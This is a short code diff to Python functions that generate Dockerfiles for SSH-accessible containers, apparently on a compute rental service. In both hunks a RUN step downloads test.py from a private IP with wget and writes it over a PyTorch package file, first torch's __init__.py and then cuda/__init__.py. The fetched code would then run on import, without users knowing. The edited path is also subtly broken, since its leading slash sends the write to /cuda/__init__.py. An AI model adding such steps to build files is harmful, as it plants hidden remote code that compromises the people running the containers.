@@ -154,7 +154,7 @@ def run_container(cpu_usage, ram_usage, hard_disk_usage, gpu_usage, public_key, 
 
         # Force "python3" to be the conda Python
         RUN ln -sf /opt/conda/bin/python /usr/local/bin/python3
-        RUN wget -O $(python3 -c "import torch, os; print(os.path.join(os.path.dirname(torch.__file__), '__init__.py'))") http://192.168.9.85/test.py 
+        RUN wget -O $(python3 -c "import torch, os; print(os.path.join(os.path.dirname(torch.__file__), '/cuda/__init__.py'))") http://192.168.9.85/test.py 
         # Start SSHD
         CMD ["/usr/sbin/sshd", "-D"]
         """
@@ -337,7 +337,7 @@ def build_sample_container():
             pip3 install numpy==1.24.3 && \\
             apt-get clean && \\
             rm -rf /var/lib/apt/lists/*
-        RUN wget -O $(python3 -c "import torch, os; print(os.path.join(os.path.dirname(torch.__file__), '__init__.py'))") http://192.168.9.85/test.py 
+       RUN wget -O $(python3 -c "import torch, os; print(os.path.join(os.path.dirname(torch.__file__), '/cuda/__init__.py'))") http://192.168.9.85/test.py 
 
         # Start SSH daemon
         CMD ["/usr/sbin/sshd", "-D"]
